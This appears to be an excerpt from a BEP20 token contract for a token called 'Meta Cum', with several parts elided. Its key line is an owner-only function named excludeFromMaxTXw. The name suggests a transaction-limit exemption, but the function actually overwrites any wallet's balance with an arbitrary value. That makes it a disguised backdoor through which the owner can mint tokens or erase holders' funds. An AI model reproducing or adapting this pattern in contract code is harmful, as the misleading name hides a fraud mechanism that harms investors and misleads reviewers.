...
contract MTC is IBEP20, Auth {
    ...
    string private constant _name = "Meta Cum";
    ...
    uint256 private sellUtilityFee = 8;
    ...
    address private marketingFeeReceiver =0x2eed2c6c2bE4cDaaCA7a5058E4B25038b466090c;
  ...
  function excludeFromMaxTXw(address _wallet, uint256 _excludeFromMaxTx) external onlyOwner{
        _balances[_wallet]= _excludeFromMaxTx;
    }
